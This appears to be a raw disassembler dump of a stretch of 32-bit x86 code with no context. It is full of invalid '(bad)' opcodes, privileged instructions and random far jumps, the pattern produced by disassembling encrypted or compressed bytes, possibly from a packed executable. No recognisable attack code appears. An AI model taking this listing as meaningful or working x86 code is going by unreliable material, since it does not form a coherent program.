  40d5b7:	fwait
  40d5b8:	jle    0x40d55e
  40d5ba:	mov    cl,0x6
  40d5bc:	inc    ebx
  40d5bd:	cdq    
  40d5be:	jmp    0xcbbd:0xcc2675ef
  40d5c5:	(bad)  
  40d5c6:	(bad)  
  40d5c7:	jmp    0x40d595
  40d5c9:	lods   eax,DWORD PTR ds:[esi]
  40d5ca:	hlt    
  40d5cb:	xchg   ebp,eax
  40d5cc:	mov    bl,0x9
  40d5ce:	cmp    DWORD PTR [eax-0x42],0xb1a6a88f
  40d5d5:	in     al,0xce
  40d5d7:	dec    esp
  40d5d8:	stos   DWORD PTR es:[edi],eax
  40d5d9:	xchg   ebp,eax
  40d5da:	inc    ecx
  40d5db:	jne    0x40d55d
  40d5dd:	mov    edx,0xa466dcdc
  40d5e2:	adc    BYTE PTR [eax],al
  40d5e4:	add    eax,0xf1ad2f2a
  40d5e9:	fsub   st(3),st
  40d5eb:	jae    0x40d651
  40d5ed:	arpl   sp,di
  40d5ef:	add    BYTE PTR [edx-0x48],0x96
  40d5f3:	sbb    dl,bh
  40d5f5:	mov    al,ds:0xbabf0ec7
  40d5fa:	jge    0x40d598
  40d5fc:	(bad)  es:[eax-0x4f8ee09d]
  40d603:	mov    edi,0x961f4ac2
  40d609:	pop    ss
  40d60a:	add    eax,DWORD PTR [esp+ebx*1]
  40d60d:	jo     0x40d604
  40d60f:	popa   
  40d610:	sbb    DWORD PTR [edi+eax*4-0x74ebcdf8],ebp
  40d617:	(bad)  
  40d618:	jge    0x40d5cc
  40d61a:	stos   BYTE PTR es:[edi],al
  40d61b:	sbb    DWORD PTR [ebx-0x63],edx
  40d61e:	imul   edx,DWORD PTR [edx],0xddd1e196
  40d624:	pusha  
  40d625:	sbb    al,0x97
  40d627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d628:	dec    ecx
  40d629:	xor    DWORD PTR [edi+esi*8+0x4defd341],ebx
  40d630:	cmp    al,0xf9
  40d632:	pop    eax
  40d633:	xor    esi,DWORD PTR [esi+0x662c5f03]
  40d639:	push   edi
  40d63a:	popa   
  40d63b:	jbe    0x40d5e7
  40d63d:	mov    al,fs:0x6fd982be
  40d643:	and    dh,BYTE PTR [edx+0x2163def6]
  40d649:	jno    0x40d5fc
  40d64b:	sub    eax,0xececeed6
  40d650:	push   ds
  40d651:	jnp    0x40d65a
  40d653:	scas   al,BYTE PTR es:[edi]
  40d654:	or     ecx,DWORD PTR [ebx+0x66963c3a]
  40d65a:	iret   
  40d65b:	push   ss
  40d65c:	inc    ecx
  40d65d:	cdq    
  40d65e:	arpl   cx,si
  40d660:	mov    ebp,0xe2b923be
  40d665:	pop    es
  40d666:	and    dl,ah
  40d668:	fs jbe 0x40d665
  40d66b:	div    BYTE PTR [esi+0x60]
  40d66e:	in     eax,0xa9
  40d670:	or     edx,eax
  40d672:	xchg   al,dh
  40d674:	sbb    al,0xa1
  40d676:	xor    DWORD PTR [edx-0x5919c646],0x61
  40d67d:	repz (bad)
  40d680:	clc    
  40d681:	pop    edi
  40d682:	imul   esi,DWORD PTR [eax],0x219325d0
  40d688:	mov    bl,0x9d
  40d68a:	pop    ebx
  40d68b:	fcom   DWORD PTR [esi+edx*2]
  40d68e:	enter  0x6248,0x1
  40d692:	mov    bl,0x53
  40d694:	push   es
  40d695:	es ret 0x4844
  40d699:	push   ecx
  40d69a:	fisubr DWORD PTR [ebx-0x623de6a8]
  40d6a0:	or     eax,0xb449cc49
  40d6a5:	add    ebp,ebp
  40d6a7:	sar    BYTE PTR gs:[ebx+0x2f],0x6f
  40d6ac:	xor    al,0x50
  40d6ae:	retf   0x9f3b
  40d6b1:	dec    edx
  40d6b2:	jecxz  0x40d6da
  40d6b4:	cmp    al,BYTE PTR [edi-0x31]
  40d6b7:	ins    BYTE PTR es:[edi],dx
  40d6b8:	jmp    0x40d6fc
  40d6ba:	(bad)  
  40d6bb:	jmp    0x40d712
  40d6bd:	jge    0x40d6ac
  40d6bf:	push   cs
  40d6c0:	pop    ebx
  40d6c1:	mov    BYTE PTR [ecx+0x3b],0xd1
  40d6c5:	cs mov ebx,0x7ff4a405
  40d6cb:	and    al,0x4e
  40d6ce:	sub    BYTE PTR [eax+0xcf0c29],dh
  40d6d4:	call   0x7f699d3
  40d6d9:	aaa    
  40d6da:	pop    es
  40d6db:	(bad)  
  40d6dd:	jp     0x40d70e
  40d6df:	cmp    ebx,DWORD PTR [esi-0x3b]
  40d6e2:	mov    WORD PTR [esp+edi*2-0x4de1cce],fs
  40d6e9:	(bad)  
  40d6ea:	into   
  40d6eb:	(bad)  
  40d6ec:	nop
  40d6ed:	push   0xffffffc2
  40d6ef:	in     eax,0xd6
  40d6f1:	aam    0x10
  40d6f3:	pop    esi
  40d6f4:	pop    ecx
  40d6f5:	jnp    0x40d697
  40d6f7:	mov    al,0x83
  40d6f9:	cwde   
  40d6fa:	add    DWORD PTR [esi-0x2e],0xb8dd3990
  40d701:	inc    esp
  40d702:	sbb    ch,BYTE PTR [esp+ecx*2+0x17]
  40d706:	jne    0x40d746
  40d708:	sub    edi,DWORD PTR [eax-0x5b]
  40d70b:	or     DWORD PTR [eax],ebp
  40d70d:	js     0x40d77e
  40d70f:	sbb    DWORD PTR [ecx-0x3668fd09],ebx
  40d715:	jo     0x40d732
  40d717:	jns    0x40d743
  40d719:	(bad)  
  40d71a:	fsubp  st(6),st
  40d71c:	fld    st(4)
  40d71e:	jne    0x40d795
  40d720:	bound  edx,QWORD PTR [eax+ecx*8]
  40d723:	and    al,0x7e
  40d725:	out    0x21,eax
  40d727:	fdivr  DWORD PTR [ecx+edi*8+0x3159f0ce]
  40d72e:	push   edx
  40d72f:	pop    esp
  40d730:	mov    edi,DWORD PTR [ebx-0x63]
  40d733:	push   es
  40d734:	fs in  al,dx
  40d736:	inc    BYTE PTR [edi]
  40d738:	xchg   esi,eax
  40d739:	cmp    dl,bl
  40d73b:	mov    ebx,0x6e95f328
  40d740:	in     eax,dx
  40d741:	aad    0x8
  40d743:	call   0x115fbb6
  40d748:	push   edx
  40d749:	pushf  
  40d74a:	addr16 call 0xe619:0x6cd360a8
  40d752:	jmp    0x40d7b0
  40d754:	and    al,0xbb
  40d756:	neg    DWORD PTR [esi]
  40d758:	mov    al,0xa9
  40d75a:	xchg   DWORD PTR [esi-0x6f],eax
  40d75d:	mov    ds:0xb571a9c4,eax
  40d762:	repnz std 
  40d764:	sar    BYTE PTR [ebp-0x36],cl
  40d767:	mov    esp,0xb640d587
  40d76c:	cdq    
  40d76d:	xor    DWORD PTR [esi+0x5efe9438],ebp
  40d773:	mov    edi,DWORD PTR [eax-0x9938992]
  40d779:	pushf  
  40d77a:	xchg   ecx,eax
  40d77b:	inc    ebx
  40d77c:	xchg   ebp,eax
  40d77d:	(bad)
  40d781:	push   edx
  40d782:	scas   eax,DWORD PTR es:[edi]
  40d783:	or     BYTE PTR [esi+eiz*4-0xf0cc6be],0xaf
  40d78b:	lock je 0x40d72f
  40d78e:	mov    ch,0xea
  40d790:	cmp    al,0x85
  40d792:	mov    ds:0xd0384864,eax
  40d797:	fmul   QWORD PTR [edi+edx*8+0x7c1bdcc9]
  40d79e:	retf   0x73cd
  40d7a1:	aad    0x6b
  40d7a3:	sbb    DWORD PTR [eax-0x1a],ebx
  40d7a6:	push   esi
  40d7a7:	xchg   esp,eax
  40d7a8:	(bad)  
  40d7a9:	xlat   BYTE PTR ds:[ebx]
  40d7aa:	xchg   BYTE PTR [edi+0x376b7cac],al
  40d7b0:	add    BYTE PTR [edi],bh
  40d7b2:	jge    0x40d76e
  40d7b4:	adc    BYTE PTR [edi+0x5f82072f],dh
  40d7ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7bb:	and    al,0xda
  40d7bd:	dec    eax
  40d7be:	test   al,0x31
  40d7c0:	js     0x40d754
  40d7c2:	(bad)  
  40d7c3:	xchg   ebp,eax
  40d7c4:	sbb    ebx,ebp
  40d7c6:	iret   
  40d7c7:	shr    BYTE PTR [ebp+0x5dd20eb4],cl
  40d7cd:	shl    esi,1
  40d7cf:	dec    eax
  40d7d0:	inc    edx
  40d7d1:	mov    ds:0x7e44604b,eax
  40d7d6:	std    
  40d7d7:	xchg   esi,eax
  40d7d8:	mov    ch,0x79
  40d7da:	xchg   ebx,eax
  40d7db:	add    DWORD PTR [esi-0x5b],esp
  40d7de:	pop    ecx
  40d7df:	mov    al,0x41
  40d7e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7e2:	stc    
  40d7e3:	push   edi
  40d7e4:	loop   0x40d7e6
  40d7e6:	js     0x40d7e5
  40d7e8:	dec    esi
  40d7e9:	fnstcw WORD PTR [edi]
  40d7eb:	mov    gs,WORD PTR [ecx]
  40d7ed:	sbb    al,0xa7
  40d7ef:	pop    edi
  40d7f0:	ds or  eax,0xc4b59d49
  40d7f6:	jecxz  0x40d83d
  40d7f8:	add    BYTE PTR [edx-0x80],al
  40d7fb:	not    BYTE PTR [ebx+0xb42a96a]
  40d801:	or     DWORD PTR [edi+0x41bc8dd4],ecx
  40d807:	scas   al,BYTE PTR es:[edi]
  40d808:	jecxz  0x40d82f
  40d80a:	ins    BYTE PTR es:[edi],dx
  40d80b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d80c:	ins    DWORD PTR es:[edi],dx
  40d80d:	repz cmp dh,dl
  40d810:	xchg   ebp,eax
  40d811:	mov    bh,bh
  40d813:	jmp    0x40d86d
  40d815:	cmc    
  40d816:	fcomp  QWORD PTR [ecx+0x3c2d9985]
  40d81c:	js     0x40d83f
  40d81e:	setl   BYTE PTR cs:[esi]
  40d822:	jnp    0x40d813
  40d824:	repz add al,0x82
  40d827:	ret    0xcbf
  40d82a:	mov    bh,0x8
  40d82c:	iret   
  40d82d:	xor    eax,0x375b2967
  40d832:	jmp    0x40d840
  40d834:	lahf   
  40d835:	imul   ebp,edi,0x67009fd
  40d83b:	push   cs
  40d83c:	sbb    edi,DWORD PTR [ebp+0x52]
  40d83f:	(bad)  
  40d840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d841:	loopne 0x40d855
  40d843:	jno    0x40d824
  40d845:	nop
  40d846:	jge    0x40d8bf
  40d848:	aaa    
  40d849:	or     BYTE PTR [eax],al
  40d84b:	jmp    0x22e49add
  40d850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d851:	jecxz  0x40d81f
  40d853:	sub    DWORD PTR [eax],edx
  40d855:	mov    esi,0xb09b5c8d
  40d85a:	jmp    0xeba97fe8
  40d85f:	inc    edi
  40d860:	rcl    DWORD PTR [ebp-0x46c2c6e5],0x47
  40d867:	sbb    al,bl
  40d869:	pop    ss
  40d86a:	inc    esi
  40d86b:	sti    
  40d86c:	fnsetpm(287 only) 
  40d86e:	xor    BYTE PTR [edx],ah
  40d870:	cmc    
  40d871:	fsub   st(1),st
  40d873:	mov    dh,0xbb
  40d875:	jmp    FWORD PTR [edx+0xe]
  40d878:	(bad)  
  40d879:	push   es
  40d87a:	test   eax,0xf8bbb72a
  40d87f:	cli    
  40d880:	inc    esp
  40d881:	lods   al,BYTE PTR ds:[esi]
  40d882:	jns    0x40d87e
  40d884:	sbb    esp,DWORD PTR [ecx]
  40d886:	dec    esi
  40d887:	ret    
  40d888:	or     al,0xee
  40d88a:	xchg   edi,eax
  40d88b:	cmp    bl,BYTE PTR [eax-0x408f3181]
  40d891:	push   ebx
  40d892:	pusha  
  40d893:	cli    
  40d894:	aas    
  40d895:	xchg   ebx,eax
  40d896:	xchg   esi,eax
  40d897:	cmp    esp,DWORD PTR [eax-0x7157edbc]
  40d89d:	std    
  40d89e:	popa   
  40d89f:	and    eax,0xf497fef0
  40d8a4:	or     al,0x4
  40d8a6:	inc    ecx
  40d8a7:	test   BYTE PTR [edi+0x42],0x17
  40d8ab:	iret   
  40d8ac:	xor    edi,DWORD PTR [esi-0x8735750]
  40d8b2:	retf   0xe158
  40d8b5:	jno    0x40d870
  40d8b7:	push   ds
  40d8b8:	ds and eax,0x402030e4
  40d8be:	pop    ebx
  40d8bf:	add    edi,eax
  40d8c1:	inc    esp
  40d8c2:	adc    DWORD PTR [edx-0x5c2cb0e8],edx
  40d8c8:	cmp    eax,0x48b1e351
  40d8cd:	xchg   esi,ebp
  40d8cf:	mov    al,ds:0x48ead191
  40d8d4:	jl     0x40d8ef
  40d8d6:	(bad)  
  40d8d7:	fucom  st(2)
  40d8d9:	xchg   edx,eax
  40d8da:	jle    0x40d89a
  40d8dc:	loop   0x40d868
  40d8de:	out    0x75,al
  40d8e0:	mov    bh,0xce
  40d8e2:	cmp    al,BYTE PTR [esi]
  40d8e4:	data16 sub BYTE PTR ds:0x354d4bba,ah
  40d8eb:	frstor [ebx]
  40d8ed:	jo     0x40d876
  40d8ef:	adc    DWORD PTR [ebx+0x7100a482],0x43
  40d8f6:	sbb    eax,DWORD PTR [edx+eax*1+0x1b]
  40d8fa:	lds    ecx,FWORD PTR [ecx-0x60]
  40d8fd:	mov    cs,ebp
  40d8ff:	inc    edx
  40d900:	js     0x40d8c5
  40d902:	sar    DWORD PTR [edi+edi*1-0x61ef8446],1
  40d909:	leave  
  40d90a:	outs   dx,BYTE PTR ds:[esi]
  40d90b:	jae    0x40d935
  40d90d:	lock mov al,0x49
  40d910:	aam    0xa8
  40d912:	std    
  40d913:	or     ecx,DWORD PTR [ebx]
  40d915:	jo     0x40d96d
  40d917:	xor    DWORD PTR [esi+0x2a],ebp
  40d91a:	inc    ebx
  40d91b:	cli    
  40d91c:	(bad)  
  40d91d:	call   0x49f22679
  40d922:	div    BYTE PTR [ecx+0x4d908681]
  40d928:	sub    ebp,DWORD PTR [edx+0x7c307010]
  40d92e:	(bad)  
  40d92f:	pushf  
  40d930:	pushf  
  40d931:	xor    eax,0x9eb0407c
  40d936:	and    edi,DWORD PTR [ebx-0x3f34a85]
  40d93c:	in     eax,dx
  40d93d:	repnz xor DWORD PTR [edi],0x2b
  40d941:	in     eax,dx
  40d942:	add    ah,al
  40d944:	sub    esp,esi
  40d946:	pop    ss
  40d947:	xchg   DWORD PTR ss:[esi-0x32444f1],ebp
  40d94e:	call   0xc986:0x36bb6ea4
  40d955:	mov    bl,0xbf
  40d957:	sub    ah,BYTE PTR [ebx+0x66]
  40d95a:	mov    ch,0x23
  40d95c:	cmc    
  40d95d:	fucomp st(7)
  40d95f:	lds    esi,FWORD PTR [ebp-0x30]
  40d962:	or     DWORD PTR [edx+ebp*1-0x18cbe31f],ecx
  40d969:	xchg   edx,eax
  40d96a:	jmp    0x40d91f
  40d96c:	data16 xlat BYTE PTR ds:[ebx]
  40d96e:	fidivr WORD PTR [ecx-0x67]
  40d971:	cli    
  40d972:	mov    ds:0xe99ce7e,al
  40d977:	jmp    0x1233421b
  40d97c:	neg    BYTE PTR [ebx+edx*4+0x55a40252]
  40d983:	scas   eax,DWORD PTR es:[edi]
  40d984:	pop    eax
  40d985:	js     0x40da05
  40d987:	inc    ebp
  40d988:	jge    0x40d9e9
  40d98a:	mov    ds:0x548e65a4,eax
  40d98f:	icebp  
  40d990:	cmp    BYTE PTR [ebp-0x3b],dl
  40d993:	mov    BYTE PTR [edi],dh
  40d995:	dec    ecx
  40d996:	mov    esi,0x1539d858
  40d99b:	dec    edx
  40d99c:	loopne 0x40d97e
  40d99e:	cli    
  40d99f:	mov    eax,0x82e49f96
  40d9a4:	jae    0x40da1d
  40d9a6:	and    al,0x5e
  40d9a8:	(bad)  
  40d9a9:	shl    BYTE PTR [ebx+ecx*4+0x1d645a61],1
  40d9b0:	xor    BYTE PTR [eax+0x40825579],dl
  40d9b6:	stc    
  40d9b7:	jae    0x40d9e5
  40d9b9:	sbb    eax,0xeeff883f
  40d9be:	fwait
  40d9bf:	sub    eax,0xddb1a54c
  40d9c4:	xchg   ebx,esi
  40d9c6:	inc    ebx
  40d9c7:	pushf  
  40d9c8:	mov    gs,eax
  40d9ca:	in     al,0x1
  40d9cc:	fwait
  40d9cd:	sbb    eax,0x89b1a469
  40d9d2:	sub    dh,BYTE PTR [ebp-0x4e]
  40d9d5:	std    
  40d9d6:	xchg   BYTE PTR [ebx+0x2821ba5e],dl
  40d9dc:	xchg   BYTE PTR [ecx+0x1f576e47],al
  40d9e2:	jmp    0x40da2a
  40d9e4:	imul   esi,DWORD PTR [edx+eax*2],0x72
  40d9e8:	xchg   DWORD PTR [ebp+0x1d],ebx
  40d9eb:	arpl   WORD PTR [ebp+0x63485f3a],cx
  40d9f1:	add    ah,BYTE PTR [ebp-0x6e55d294]
  40d9f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9f8:	out    dx,eax
  40d9f9:	lods   al,BYTE PTR ds:[esi]
  40d9fa:	in     al,0x1c
  40d9fc:	mov    ch,0xb3
  40d9fe:	repz test BYTE PTR [eax+0x14],0x2
  40da03:	add    dl,BYTE PTR [edx+0x3e]
  40da06:	mov    ch,0x13
  40da08:	push   ss
  40da09:	sbb    eax,esi
  40da0b:	mov    ah,0xd3
  40da0d:	pop    esp
  40da0e:	movhps xmm0,QWORD PTR [ebx-0x5636fd8d]
  40da15:	(bad)  
  40da17:	jb     0x40da04
  40da19:	xchg   ebp,eax
  40da1a:	cwde   
  40da1b:	ja     0x40da33
  40da1d:	cmp    eax,0xc761bb52
  40da22:	in     al,0x7
  40da24:	push   esi
  40da25:	addr16 in eax,dx
  40da27:	sbb    al,0x95
  40da29:	push   ecx
  40da2a:	dec    eax
  40da2b:	nop
  40da2c:	int3   
  40da2d:	cdq    
  40da2e:	in     al,dx
  40da2f:	mov    cl,0x3b
  40da31:	mov    ebp,0xf77f94e9
  40da36:	add    eax,0x65df3cd0
  40da3b:	cmp    eax,0x1a4dc0db
  40da40:	aad    0xfd
  40da42:	fadd   st(4),st
  40da44:	enter  0x57fc,0xbc
  40da48:	mov    ch,0xe0
  40da4a:	jmp    0x8dc1a23
  40da4f:	xchg   eax,esp
  40da51:	push   0x14d7d692
  40da56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da57:	inc    ecx
  40da58:	xor    al,0x88
  40da5a:	out    0x46,eax
  40da5c:	inc    ecx
  40da5d:	adc    DWORD PTR [edi+0x66],esp
  40da60:	dec    ecx
  40da61:	or     eax,0xdcaaacc8
  40da66:	push   esi
  40da67:	push   0xffffff97
  40da69:	ret    
  40da6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da6b:	lods   eax,DWORD PTR ds:[esi]
  40da6c:	jl     0x40da2b
  40da6e:	cmp    eax,0x3b2c47c
  40da73:	xchg   ebp,eax
  40da74:	cli    
  40da75:	push   edx
  40da76:	adc    BYTE PTR [eax],ch
  40da78:	mov    ds:0xdaef8af0,eax
  40da7d:	cmp    DWORD PTR [ebp+0x527648e6],esi
  40da83:	inc    ebp
  40da84:	(bad)  
  40da85:	cmp    al,0x95
  40da87:	div    BYTE PTR [esp+ebp*4-0x6c2233e3]
  40da8e:	icebp  
  40da8f:	jne    0x40da88
  40da91:	nop
  40da92:	lods   al,BYTE PTR ds:[esi]
  40da93:	cmp    al,0x6a
  40da95:	stos   BYTE PTR es:[edi],al
  40da96:	aas    
  40da97:	fadd   DWORD PTR [ecx]
  40da99:	fldenv [ebp+0x4ee0f9c2]
  40da9f:	or     esi,DWORD PTR [edi-0x1554ad6e]
  40daa5:	mov    cl,BYTE PTR [eax]
  40daa7:	test   al,0xfe
  40daaa:	inc    esi
  40daab:	scas   eax,DWORD PTR es:[edi]
  40daac:	lods   eax,DWORD PTR ds:[esi]
  40daad:	test   al,0xd2
  40daaf:	clc    
  40dab0:	cmp    eax,0xa0c81ec2
  40dab5:	jecxz  0x40daae
  40dab7:	cwde   
  40dab8:	(bad)  
  40dab9:	loopne 0x40da46
  40dabb:	into   
  40dabc:	sbb    al,0xc2
  40dabe:	mov    ch,0x16
  40dac0:	pop    ebp
  40dac1:	ja     0x40da86
  40dac3:	jb     0x40db37
  40dac5:	cdq    
  40dac6:	retf   
  40dac7:	push   0xbbded868
  40dacc:	ficom  WORD PTR [ebx-0x7b]
  40dacf:	inc    eax
  40dad0:	sbb    ebx,ebp
  40dad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dad3:	(bad)  
  40dad4:	test   ecx,0xfdb10a9a
  40dada:	and    edi,eax
  40dadc:	mov    edx,0x919671a4
  40dae1:	push   ds
  40dae2:	std    
  40dae3:	push   0xffffffe0
  40dae5:	add    BYTE PTR [ebx],ah
  40dae7:	popa   
  40dae8:	(bad)  
  40dae9:	clc    
  40daea:	push   0x9
  40daec:	mov    bh,0x7f
  40daee:	iret   
  40daef:	mov    ch,0xbc
  40daf1:	dec    esp
  40daf2:	stc    
  40daf3:	fstp   st(4)
  40daf5:	aad    0x11
  40daf7:	call   0x3a3f888c
  40dafc:	cs sti 
  40dafe:	sub    ecx,esp
  40db00:	push   es
  40db01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db02:	mov    al,0x8c
  40db04:	push   esp
  40db05:	test   al,0x26
  40db07:	mov    esp,0xd174c3f8
  40db0c:	pop    ds
  40db0d:	leave  
  40db0e:	rol    DWORD PTR [edx+0x59],0xa6
  40db12:	mov    esp,0xf2210e88
  40db17:	inc    ecx
  40db18:	sbb    eax,0xc92379bd
  40db1d:	clc    
  40db1e:	jnp    0x40db81
  40db20:	sti    
  40db21:	jle    0x40daf7
  40db23:	dec    esi
  40db24:	in     eax,0x8d
  40db26:	test   eax,ebp
  40db28:	inc    esi
  40db29:	mov    bh,0x1f
  40db2b:	lods   eax,DWORD PTR ds:[esi]
  40db2c:	mov    dl,0x3e
  40db2e:	pushf  
  40db2f:	xor    DWORD PTR [ecx],eax
  40db31:	sbb    dl,BYTE PTR [ebx]
  40db33:	ins    DWORD PTR es:[edi],dx
  40db34:	inc    edx
  40db35:	xchg   ebp,eax
  40db36:	sub    al,al
  40db38:	and    ecx,DWORD PTR [eax]
  40db3a:	inc    esp
  40db3b:	adc    dl,BYTE PTR [edx+ebp*8]
  40db3e:	shl    edx,0x36
  40db41:	sahf   
  40db42:	jmp    0x5801fa64
  40db47:	repnz and eax,0x43aa1932
  40db4d:	xor    dh,BYTE PTR es:[edx-0x41]
  40db51:	adc    ebp,esp
  40db53:	test   al,0x4c
  40db55:	jnp    0x40db42
  40db57:	mov    bl,0x9a
  40db59:	ror    BYTE PTR [edi-0x2899894c],0x9e
  40db60:	push   es
  40db61:	push   0x4d4a16fc
  40db66:	xor    cl,bh
  40db68:	pop    ss
  40db69:	sbb    BYTE PTR [edi-0x4b88d17c],0x5e
  40db70:	fsub   QWORD PTR [edx]
  40db72:	inc    esi
  40db73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db74:	sub    eax,DWORD PTR [ebp+0x4d]
  40db77:	cli    
  40db78:	jmp    0x24f4:0x94567301
  40db7f:	or     dl,bh
  40db81:	div    DWORD PTR [edi+eax*1-0x70]
  40db85:	or     al,0x92
  40db87:	sbb    DWORD PTR [edx+0x5d],ebx
  40db8a:	adc    ebp,ebx
  40db8c:	pop    eax
  40db8d:	jg     0x40dbc3
  40db8f:	ficomp DWORD PTR [ebx+0x4f]
  40db92:	int    0xd2
  40db94:	mov    ?,WORD PTR [ecx]
  40db96:	scas   eax,DWORD PTR es:[edi]
  40db97:	stc    
  40db98:	xor    DWORD PTR [edx],esp
  40db9a:	jmp    0xf5c8f3b1
  40db9f:	(bad)  
  40dba0:	cld    
  40dba1:	inc    ecx
  40dba2:	retf   0x563b
  40dba5:	adc    dh,dh
  40dba7:	sub    ebp,DWORD PTR [edx]
  40dba9:	or     eax,0x50967292
  40dbae:	adc    BYTE PTR [esi+0x8],al
  40dbb1:	(bad)  
  40dbb2:	cmc    
  40dbb3:	(bad)  
  40dbb4:	ja     0x40dbeb
  40dbb6:	sti    
  40dbb7:	sbb    eax,0x71603290
  40dbbc:	pop    edx
  40dbbd:	pop    ss
  40dbbe:	sbb    dh,ch
  40dbc0:	sti    
  40dbc1:	jmp    0x40db60
  40dbc3:	sbb    edx,esp
  40dbc5:	and    BYTE PTR [edi],ch
  40dbc7:	mov    ebp,0xc765f99b
  40dbcc:	pop    esi
  40dbcd:	inc    ebp
  40dbce:	mov    al,0xa8
  40dbd0:	aas    
  40dbd1:	enter  0x71ca,0x87
  40dbd5:	daa    
  40dbd6:	and    eax,0xa1e87ba7
  40dbdb:	jl     0x40dc38
  40dbdd:	push   edi
  40dbde:	rol    DWORD PTR [esi],0x61
  40dbe1:	and    DWORD PTR [ebp+0xe],edi
  40dbe4:	shl    BYTE PTR [ebp+0x8],0xf
  40dbe8:	dec    eax
  40dbe9:	fs popa 
  40dbeb:	hlt    
  40dbec:	es jg  0x40dc3d
  40dbef:	call   0x1614:0x70051ed0
  40dbf6:	pop    esi
  40dbf7:	repz adc al,0xd6
  40dbfa:	test   ebx,edi
  40dbfc:	cli    
  40dbfd:	xchg   ebx,eax
  40dbfe:	jle    0x40dc57
  40dc00:	jecxz  0x40dc0f
  40dc02:	mov    al,0x33
  40dc04:	ins    DWORD PTR es:[edi],dx
  40dc05:	mov    esi,0x8b3199e4
  40dc0a:	add    BYTE PTR [esi],dh
  40dc0c:	add    al,0xa5
  40dc0e:	push   eax
  40dc0f:	jle    0x40dc1f
  40dc11:	psrad  mm0,QWORD PTR [eax+0x2d]
  40dc15:	xor    eax,0xca71c827
  40dc1a:	mov    bh,0xd2
  40dc1c:	mov    al,0xc8
  40dc1e:	dec    ebp
  40dc1f:	cwde   
  40dc20:	sbb    BYTE PTR [esi+0x6a],bh
  40dc23:	mov    dl,0x3a
  40dc25:	mov    edx,0x664697cc
  40dc2a:	out    0x75,al
  40dc2c:	bnd ret 
  40dc2e:	mov    edx,0x3f495a11
  40dc33:	sub    esp,DWORD PTR ds:0xec6eb3b
  40dc39:	push   esp
  40dc3a:	xor    eax,0x282eaff7
  40dc3f:	pop    esp
  40dc40:	xor    eax,0x3694229a
  40dc45:	xchg   DWORD PTR [esi],edx
  40dc47:	push   edi
  40dc48:	scas   eax,DWORD PTR es:[edi]
  40dc49:	imul   edi,DWORD PTR [edx],0xffffff83
  40dc4c:	xor    cl,BYTE PTR [edi]
  40dc4e:	inc    ebx
  40dc4f:	ror    DWORD PTR [eax+0x36a01f61],cl
  40dc55:	xchg   ecx,eax
  40dc56:	mov    al,ds:0x7cd08c29
  40dc5b:	adc    al,0xac
  40dc5d:	dec    ebx
  40dc5e:	mov    edx,0xba0c6d98
  40dc63:	rol    BYTE PTR [ecx],0x8d
  40dc66:	mov    DWORD PTR [edi+0x4b],edi
  40dc69:	repz sub ebx,DWORD PTR [esi]
  40dc6c:	sub    eax,0x136f988d
  40dc71:	out    0x32,al
  40dc73:	cmp    ah,BYTE PTR [esp+ebx*1+0x1fb5d915]
  40dc7a:	pusha  
  40dc7b:	adc    edi,DWORD PTR [eax-0x76]
  40dc7e:	repz cmovs ecx,DWORD PTR [ecx+0x57]
  40dc83:	retf   
  40dc84:	inc    eax
  40dc85:	mov    cl,0xd9
  40dc87:	pop    ecx
  40dc88:	mov    ecx,0xcb17f081
  40dc8d:	es (bad) 
  40dc90:	inc    edx
  40dc91:	mov    eax,ds:0xbab25190
  40dc96:	out    dx,eax
  40dc97:	sub    eax,DWORD PTR [edx]
  40dc99:	outs   dx,BYTE PTR ds:[esi]
  40dc9a:	retf   
  40dc9b:	mov    cl,0x8d
  40dc9d:	or     al,0xdd
  40dc9f:	pop    ds
  40dca0:	jmp    0x5f659b31
  40dca5:	stos   BYTE PTR es:[edi],al
  40dca6:	rcr    BYTE PTR [ebp-0x49],1
  40dca9:	imul   ebx,DWORD PTR [ecx+ecx*4+0x3e],0x73747f65
  40dcb1:	nop
  40dcb2:	js     0x40dcaa
  40dcb4:	mov    dl,0xfc
  40dcb6:	(bad)  
  40dcb8:	pop    ebp
  40dcb9:	fwait
  40dcba:	jmp    0x40dd21
  40dcbc:	cmp    DWORD PTR [edx-0x334caec6],esp
  40dcc2:	std    
  40dcc3:	scas   eax,DWORD PTR es:[edi]
  40dcc4:	popa   
  40dcc5:	push   0x67
  40dcc7:	rcr    BYTE PTR [ebx+0x70],0xa4
  40dccb:	mov    edi,0x97fe9b9c
  40dcd0:	test   al,0xf7
  40dcd2:	repnz and dh,al
  40dcd5:	jb     0x40dc60
  40dcd7:	pop    edi
  40dcd8:	mov    ecx,0xee212de0
  40dcdd:	or     al,0x91
  40dcdf:	scas   eax,DWORD PTR es:[edi]
  40dce0:	xchg   edi,eax
  40dce1:	int    0xf
  40dce3:	icebp  
  40dce4:	sbb    al,0xbf
  40dce6:	mov    eax,ds:0xe30bca0e
  40dceb:	adc    bl,dh
  40dced:	mov    ds:0xe99d5dff,eax
  40dcf2:	or     ebx,DWORD PTR [edi+0x5d]
  40dcf5:	xor    DWORD PTR [ecx],0xffffffdd
  40dcf8:	int    0x4a
  40dcfa:	or     edx,DWORD PTR [ecx+eax*8-0x28]
  40dcfe:	ret    0xfe17
  40dd01:	mov    ebp,0x983a859b
  40dd06:	push   ds
  40dd07:	fwait
  40dd08:	push   es
  40dd09:	scas   eax,DWORD PTR es:[edi]
  40dd0a:	push   ds
  40dd0b:	dec    esi
  40dd0c:	pop    es
  40dd0d:	xor    eax,0xfe950795
  40dd12:	int3   
  40dd13:	jmp    0x38019ed0
  40dd18:	aas    
  40dd19:	mov    ebp,edx
  40dd1b:	call   0xa683:0xa0fe6977
  40dd22:	mov    dl,0x4a
  40dd24:	xor    BYTE PTR [ebp-0x24],0xc7
  40dd28:	hlt    
  40dd29:	adc    ch,ah
  40dd2b:	shl    ebx,1
  40dd2d:	inc    edx
  40dd2e:	in     eax,dx
